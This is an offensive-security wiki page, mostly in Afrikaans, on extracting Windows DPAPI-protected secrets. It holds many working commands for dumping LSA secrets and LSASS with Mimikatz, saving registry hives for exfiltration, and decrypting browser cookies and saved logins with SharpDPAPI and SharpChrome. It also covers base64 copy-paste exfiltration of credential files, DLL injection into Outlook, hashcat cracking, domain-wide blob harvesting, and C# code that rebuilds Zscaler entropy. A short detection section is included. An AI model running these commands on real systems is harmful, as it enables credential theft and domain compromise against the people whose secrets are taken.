# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **symmetric encryption of asymmetric private keys**, en maak gebruik van óf gebruiker- óf stelselgeheime as ’n belangrike bron van `entropy`. Hierdie benadering vereenvoudig enkripsie vir ontwikkelaars deur hulle in staat te stel om data te enkripteer met ’n sleutel wat afgelei is van die gebruiker se aanmeldgeheime of, vir stelsel-enkripsie, die stelsel se domein-verifikasiegeheime, sodat ontwikkelaars self nie die beskerming van die enkripsiesleutel hoef te bestuur nie.

Die algemeenste manier om DPAPI te gebruik is deur die **`CryptProtectData` en `CryptUnprotectData`** funksies, wat toepassings toelaat om data veilig te enkripteer en te dekripsieer binne die sessie van die proses wat tans aangemeld is. Dit beteken dat die geënkripteerde data slegs deur dieselfde gebruiker of stelsel gedekripteer kan word wat dit geënkripteer het.

Bo en behalwe, hierdie funksies aanvaar ook ’n **`entropy` parameter** wat ook tydens enkripsie en dekripsie gebruik sal word; daarom, om iets te dekripteer wat met hierdie parameter geënkripteer is, moet jy dieselfde `entropy` waarde verskaf wat tydens enkripsie gebruik is.

### Gebruiker se sleutelgenerering

Die DPAPI genereer ’n unieke sleutel (genoem **`pre-key`**) vir elke gebruiker gebaseer op hulle geloofsbriewe. Hierdie sleutel word afgelei van die gebruiker se wagwoord en ander faktore; die algoritme hang af van die tipe gebruiker maar lei uiteindelik tot ’n SHA1. Byvoorbeeld, vir domeingebruikers, **hang dit af van die NTLM hash van die gebruiker**.

Dit is besonder interessant omdat as ’n aanvaller die gebruiker se wagwoord-hash kan bekom, hulle kan:

- **Decrypt any data that was encrypted using DPAPI** met daardie gebruiker se sleutel sonder om enige API te kontak
- Probeer om die wagwoord offline te **crack** om die geldige DPAPI-sleutel te genereer

Verder, elke keer as ’n gebruiker data met DPAPI enkripteer, word ’n nuwe **master key** gegenereer. Hierdie master key is die een wat werklik gebruik word om data te enkripteer. Elke master key word geassosieer met ’n **GUID** (Globally Unique Identifier) wat dit identifiseer.

Die master keys word gestoor in die **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gids, waar `{SID}` die Security Identifier van daardie gebruiker is. Die master key word gestoor versleuteld deur die gebruiker se **`pre-key`** en ook deur ’n **domein-rugsteunsleutel** vir herstel (dus word dieselfde sleutel twee keer deur twee verskillende sleutels versleuteld gestoor).

Neem kennis dat die **domein sleutel wat die master key enkripteer in die domain controllers is en nooit verander nie**, so as ’n aanvaller toegang tot die domain controller het, kan hulle die domein-rugsteunsleutel bekom en die master keys van alle gebruikers in die domein dekripteer.

Die geënkripteerde blobs bevat die **GUID van die master key** wat gebruik is om die data binne hul headers te enkripteer.

> [!TIP]
> DPAPI encrypted blobs begin met **`01 00 00 00`**

Vind master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System sleutel-generering

Dit is die sleutel wat deur die masjien gebruik word om data te enkripteer. Dit is gebaseer op die **DPAPI_SYSTEM LSA secret**, wat 'n spesiale sleutel is waartoe slegs die SYSTEM user toegang het. Hierdie sleutel word gebruik om data te enkripteer wat deur die stelsel self beskikbaar moet wees, soos masjienvlak credentials of stelsel-wye geheime.

Let wel dat hierdie sleutels **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction from registry hives is also possible. For example, as an administrator on the target, save the hives and exfiltrate them:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Voer dit dan op jou analise-boks uit: haal die DPAPI_SYSTEM LSA secret uit die hives en gebruik dit om machine-scope blobs te decrypt (scheduled task passwords, service credentials, Wi‑Fi profiles, etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Deur DPAPI beskermde data

Onder die persoonlike data wat deur DPAPI beskerm word, is:

- Windows creds
- Internet Explorer- en Google Chrome-wagwoorde en outo-aanvuldata
- E-pos en interne FTP-rekeningwagwoorde vir toepassings soos Outlook en Windows Mail
- Wagwoorde vir gedeelde vouers, hulpbronne, draadlose netwerke, en Windows Vault, insluitend enkripsiesleutels
- Wagwoorde vir remote desktop-verbindinge, .NET Passport, en private sleutels vir verskeie enkripsie- en verifiëringsdoeleindes
- Netwerkwagwoorde wat deur Credential Manager bestuur word en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger, en meer
- Geënkripteerde blobs binne die register
- ...

Stelselbeskermde data sluit in:
- Wifi-wagwoorde
- Geskeduleerde taakwagwoorde
- ...

### Opsies om meester-sleutels te onttrek

- As die gebruiker domeinadministrateur-privileges het, kan hulle toegang verkry tot die **domain backup key** om alle gebruikersmeestersleutels in die domein te ontsleutel:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Met lokale admin-regte is dit moontlik om **toegang tot die LSASS memory** te kry om die DPAPI meestersleutels van al die aangeslote gebruikers en die SYSTEM-sleutel uit te trek.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- As die gebruiker plaaslike admin-voorregte het, kan hulle toegang kry tot die **DPAPI_SYSTEM LSA secret** om die masjien-hoofsleutels te ontsleutel:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- As die gebruiker se wagwoord of NTLM-hash bekend is, kan jy **die meester-sleutels van die gebruiker direk ontsleutel**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- As jy binne 'n sessie as die gebruiker is, is dit moontlik om die DC te vra vir die **backup key to decrypt the master keys using RPC**. As jy local admin is en die gebruiker aangemeld is, kan jy **steal his session token** hiervoor:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lys Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Toegang tot DPAPI-versleutelde data

### Vind DPAPI-versleutelde data

Algemene gebruikers se **beskermde lêers** vind jy in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kyk ook na die verandering van `\Roaming\` na `\Local\` in bogenoemde paaie.

Voorbeelde van enumerasie:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI-versleutelde blobs in die lêerstelsel, register en B64-blobs vind:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Let daarop dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (van dieselfde repo) gebruik kan word om met DPAPI sensitiewe data soos cookies te ontsleutel.

#### Chromium/Edge/Electron vinnige resepte (SharpChrome)

- Huidige gebruiker, interaktiewe ontsleuteling van gestoorde logins/cookies (werks selfs met Chrome 127+ app-bound cookies omdat die ekstra sleutel vanaf die gebruiker se Credential Manager opgelos word wanneer dit in gebruikerskonteks uitgevoer word):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Ontkoppelde ontleding wanneer jy slegs lêers het. Haal eers die AES state-sleutel uit die profiel se "Local State" en gebruik dit dan om die cookie DB te ontsleutel:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domeinwyd/remote triage wanneer jy die DPAPI domain backup key (PVK) en admin op die target host het:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- As jy 'n gebruiker se DPAPI prekey/credkey (van LSASS) het, kan jy password cracking oorslaan en profieldata direk dekripteer:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Aantekeninge
- Nuwer Chrome/Edge builds mag sekere koekies stoor met "App-Bound" enkripsie. Offline-dekripsie van daardie spesifieke koekies is nie moontlik sonder die bykomende app-bound sleutel nie; voer SharpChrome binne die teikengebruiker se kontekst uit om dit outomaties te verkry. Sien die verwysing na die Chrome security blogpost hieronder.

### Toegangssleutels en data

- **Use SharpDPAPI** om kredensiale te bekom uit DPAPI-geënkripteerde lêers van die huidige sessie:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kry credentials inligting** soos die encrypted data en die guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Toegang tot meestersleutels**:

Ontsleutel 'n meestersleutel van 'n gebruiker wat die **domein-rugsteun-sleutel** via RPC versoek:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Die **SharpDPAPI**-hulpmiddel ondersteun ook hierdie argumente vir masterkey-dekripsie (let daarop hoe dit moontlik is om `/rpc` te gebruik om die domein se rugsteun-sleutel te kry, `/password` om 'n plattekstwagwoord te gebruik, of `/pvk` om 'n DPAPI-domein privaat-sleutel-lêer te spesifiseer...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Ontsleutel data met 'n masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Die **SharpDPAPI**-tool ondersteun ook die volgende argumente vir `credentials|vaults|rdg|keepass|triage|blob|ps` ontsleuteling (let op hoe dit moontlik is om `/rpc` te gebruik om die domain se backup key te kry, `/password` om 'n plaintext password te gebruik, `/pvk` om 'n DPAPI domain private key file te spesifiseer, `/unprotect` om die huidige gebruiker se sessie te gebruik...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Gebruik 'n DPAPI prekey/credkey direk (geen wagwoord benodig)

Indien jy LSASS kan dump, openbaar Mimikatz dikwels 'n per-logon DPAPI key wat gebruik kan word om die gebruiker se masterkeys te decrypt sonder om die plaintext password te ken. Gee hierdie waarde direk aan die tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Ontsleutel sekere data met behulp van die **huidige gebruikersessie**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption with Impacket dpapi.py

As jy die slagoffer se SID en wagwoord (of NT hash) het, kan jy DPAPI masterkeys en Credential Manager blobs heeltemal offline ontsleutel met Impacket’s dpapi.py.

- Identifiseer artefakte op skyf:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- As lêer-oordraggereedskap onbetroubaar is, base64 die lêers op die gasheer en kopieer die uitvoer:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Ontsleutel die masterkey met die gebruiker se SID en password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Gebruik die gedekripteerde masterkey om die credential blob te dekripteer:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Hierdie workflow haal dikwels domeinkredensiële terug wat deur toepassings in die Windows Credential Manager gestoor word, insluitende administratiewe rekeninge (bv., `*_adm`).

---

### Hantering van Opsionele Entropie ("Third-party entropy")

Sommige toepassings gee 'n addisionele **entropie**-waarde aan `CryptProtectData`. Sonder hierdie waarde kan die blob nie gedekripteer word nie, selfs al is die korrekte masterkey bekend. Om die entropie te bekom is dus noodsaaklik wanneer jy kredensiële teiken wat op hierdie manier beskerm is (bv. Microsoft Outlook, sekere VPN-kliente).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is 'n user-mode DLL wat die DPAPI-funksies in die teikenproses haak en op deursigtige wyse enige opsionele entropie opneem wat verskaf word. Wanneer EntropyCapture in **DLL-injection**-modus op prosesse soos `outlook.exe` of `vpnclient.exe` uitgevoer word, produseer dit 'n lêer wat elke entropiebuffer aan die oproepende proses en blob koppel. Die vasgevange entropie kan later aan **SharpDPAPI** (`/entropy:`) of **Mimikatz** (`/entropy:<file>`) voorsien word om die data te dekripteer.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys aflyn (Hashcat & DPAPISnoop)

Microsoft het 'n **context 3** masterkey-formaat geïntroduceer begin met Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) het hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) en **22102** (context 3) bygevoeg, wat GPU-versnelde cracking van gebruikerswachtwoorde direk vanaf die masterkey-lêer moontlik maak. Aanvallers kan dus word-list of brute-force attacks uitvoer sonder om met die teikenstelsel te interaksioneer.

`DPAPISnoop` (2024) automatiseer die proses:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Die tool kan ook Credential- en Vault-blobs ontleed, hulle met gekraakte sleutels ontsleutel en cleartext passwords uitvoer.

### Toegang tot ander masjien se data

In **SharpDPAPI and SharpChrome** kan jy die **`/server:HOST`** opsie aandui om toegang tot 'n afstandsmasjien se data te kry. Natuurlik moet jy daardie masjien kan bereik en in die volgende voorbeeld word aanvaar dat die **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ander gereedskap

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n instrument wat die onttrekking van alle gebruikers en rekenaars uit die LDAP-direktorie en die onttrekking van die domain controller backup key via RPC outomatiseer. Die skript sal dan alle rekenaars se IP-adresse oplos en 'n smbclient op alle rekenaars uitvoer om alle DPAPI blobs van alle gebruikers te haal en alles met die domain backup key te ontsleutel.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die uit LDAP onttrekte rekenaarslys kan jy elke subnet vind, selfs al het jy nie van hulle geweet nie!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan geheimenisse wat deur DPAPI beskerm word outomaties uitgooi. Die 2.x-uitgawe het die volgende gebring:

* Parallelle versameling van blobs van honderde hosts
* Ontleding van **context 3** masterkeys en outomatiese integrasie met Hashcat vir kraking
* Ondersteuning vir Chrome "App-Bound" geënkripteerde koekies (sien volgende afdeling)
* 'n Nuwe **`--snapshot`**-modus om eindpunte herhaaldelik te peil en nuut geskepte blobs te vergelyk

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is 'n C#-parser vir masterkey/credential/vault-lêers wat Hashcat/JtR-formate kan uitskryf en opsioneel kraking outomaties kan aanroep. Dit ondersteun ten volle machine- en user masterkey-formatte tot Windows 11 24H1.


## Algemene opsporings

- Toegang tot lêers in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante gidse.
- Veral vanaf 'n netwerkshare soos **C$** of **ADMIN$**.
- Gebruik van **Mimikatz**, **SharpDPAPI** of soortgelyke gereedskap om toegang tot LSASS-geheue te kry of om masterkeys te dump.
- Gebeurtenis **4662**: *An operation was performed on an object* – kan gekorreleer word met toegang tot die **`BCKUPKEY`**-object.
- Gebeurtenis **4673/4674** wanneer 'n proses *SeTrustedCredManAccessPrivilege* (Credential Manager) versoek

---
### 2023-2025 kwesbaarhede & ekosisteemveranderinge

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). 'n Aanvaller met netwerktoegang kon 'n domain member mislei om 'n kwaadwillige DPAPI backup key op te vra, wat die ontsleuteling van user masterkeys moontlik maak. Gepatch in die November 2023 kumulatiewe opdatering – administrateurs moet verseker dat DCs en werkstasies volledig gepatch is.
* **Chrome 127 “App-Bound” cookie encryption** (Julie 2024) het die ou DPAPI-alleen beskerming vervang met 'n bykomende sleutel wat in die gebruiker se **Credential Manager** gestoor word. Offline ontsleuteling van koekies vereis nou beide die DPAPI masterkey en die **GCM-wrapped app-bound key**. SharpChrome v2.3 en DonPAPI 2.x kan die ekstra sleutel herstel wanneer hulle met user context loop.


### Gevalstudie: Zscaler Client Connector – Custom Entropy Afgeleid van SID

Zscaler Client Connector stoor verskeie konfigurasielêers onder `C:\ProgramData\Zscaler` (bv. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Elke lêer is geënkripteer met **DPAPI (Machine scope)**, maar die verskaffer voorsien **custom entropy** wat *by runtime bereken* word in plaas daarvan dat dit op skyf gestoor word.

Die entropy word herbou uit twee elemente:

1. 'n Hard-gekodeerde geheim ingebed in `ZSACredentialProvider.dll`.
2. Die **SID** van die Windows-rekening waaraan die konfigurasie behoort.

Die algoritme geïmplementeer deur die DLL is ewewaardig aan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Omdat die geheim in 'n DLL ingebed is wat vanaf die skyf gelees kan word, kan **enige plaaslike aanvaller met SYSTEM rights die entropy vir enige SID wederom genereer** en die blobs offline ontsleutel:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Dekripsie lewer die volledige JSON-konfigurasie, insluitend elke **device posture check** en die verwagte waarde – inligting wat baie waardevol is wanneer kliëntkant-bypasses probeer word.

> TIP: die ander geënkripteerde artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) word beskerm deur DPAPI **sonder** entropie (`16` zero bytes). Hulle kan daarom direk gedekripteer word met `ProtectedData.Unprotect` sodra SYSTEM-regte verkry is.

## Verwysings

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
